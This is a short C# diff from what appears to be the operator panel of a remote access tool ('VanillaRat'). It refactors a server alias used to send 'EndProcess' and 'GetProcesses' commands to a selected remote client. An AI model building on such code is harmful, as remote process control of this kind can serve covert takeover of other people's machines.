@@ -7,10 +7,10 @@ using System.Threading.Tasks;
 using System.Windows;
 using System.Windows.Input;
 using TaskManager.Command;
-using VanillaRat.Classes;
 using WpfApp15.Model.Program;
 using WpfApp15.Scripts.Other;
 using WpfApp15.ViewModel;
+using Serverr = Server.Server;
 
 namespace WpfApp15.Scripts.Model.Program
 {
@@ -39,11 +39,11 @@ namespace WpfApp15.Scripts.Model.Program
                 MessageBox.Show("Please select a process!", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                 return;
             }
-            Server.MainServer.Send(TaskManager.ViewModel.selectedData.Id,
+            Serverr.MainServer.Send(TaskManager.ViewModel.selectedData.Id,
                 Encoding.ASCII.GetBytes("EndProcess<{" + selectedProcesses.Id + "}>"));
             await Task.Delay(50);
             Processes.Remove(selectedProcesses);
-            Server.MainServer.Send(TaskManager.ViewModel.selectedData.Id, Encoding.ASCII.GetBytes("GetProcesses"));
+            Serverr.MainServer.Send(TaskManager.ViewModel.selectedData.Id, Encoding.ASCII.GetBytes("GetProcesses"));
         }
 
         private async Task  Refresh()
@@ -57,7 +57,7 @@ namespace WpfApp15.Scripts.Model.Program
                 Name = await GetSubstringByString("{", "}", i),
                 RealName = await GetSubstringByString("[", "]", i)
             }));
-            Server.MainServer.Send(TaskManager.ViewModel.selectedData.Id, Encoding.ASCII.GetBytes("GetProcesses"));
+            Serverr.MainServer.Send(TaskManager.ViewModel.selectedData.Id, Encoding.ASCII.GetBytes("GetProcesses"));
             await Task.Delay(100);
             await Refresh();
         }
